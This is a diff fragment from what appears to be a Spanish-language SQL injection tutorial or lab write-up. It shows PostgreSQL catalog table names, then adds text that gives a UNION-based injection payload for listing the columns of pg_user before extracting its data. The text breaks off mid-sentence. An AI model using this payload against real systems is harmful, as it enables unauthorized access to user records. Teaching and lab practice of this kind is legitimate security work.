@@ -182,3 +182,5 @@ foreign_data_wrapper_options
 pg_inherits
 pg_stat_xact_all_tables
 column_options
+
+Una vez enumeradas las tablas, buscamos las que parezcan tener los usuarios, en este caso: pg_user, para poder extraer los datos de una tabla, necesitamos saber los nombres de sus columnas, podemos hacerlo con este comando:' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'pg_user'--, obteniendo asi
